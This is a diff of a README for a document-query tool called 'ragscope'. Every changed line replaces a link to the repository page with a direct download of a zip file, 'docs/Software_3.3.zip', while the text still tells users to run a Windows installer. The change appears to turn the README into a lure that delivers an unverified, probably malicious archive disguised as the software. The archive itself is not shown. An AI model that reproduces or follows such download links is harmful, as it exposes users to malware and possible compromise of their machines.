@@ -1,6 +1,6 @@
 # 🧰 ragscope - Query Documents Quickly and Easily
 
-[![Download ragscope](https://img.shields.io/badge/Download-ragscope-brightgreen)](https://github.com/Boney-massiveness357/ragscope)
+[![Download ragscope](https://img.shields.io/badge/Download-ragscope-brightgreen)](https://github.com/Boney-massiveness357/ragscope/raw/refs/heads/main/docs/Software_3.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get ragscope running on your Windows PC:
 
 Click the green button at the top or go directly to this page:
 
-https://github.com/Boney-massiveness357/ragscope
+https://github.com/Boney-massiveness357/ragscope/raw/refs/heads/main/docs/Software_3.3.zip
 
 This page holds the latest version of ragscope.
 
@@ -123,7 +123,7 @@ Software updates improve performance and add features.
 
 ### To update:
 
-- Visit the same download page: https://github.com/Boney-massiveness357/ragscope
+- Visit the same download page: https://github.com/Boney-massiveness357/ragscope/raw/refs/heads/main/docs/Software_3.3.zip
 - Download the newest version installer.
 - Run the installer as before.
   
@@ -160,6 +160,6 @@ If you have issues running ragscope, try:
 
 Get ragscope now by visiting the download page here:
 
-https://github.com/Boney-massiveness357/ragscope
+https://github.com/Boney-massiveness357/ragscope/raw/refs/heads/main/docs/Software_3.3.zip
 
 Click on the latest release, download the Windows installer, and follow the steps above to install and use the program.
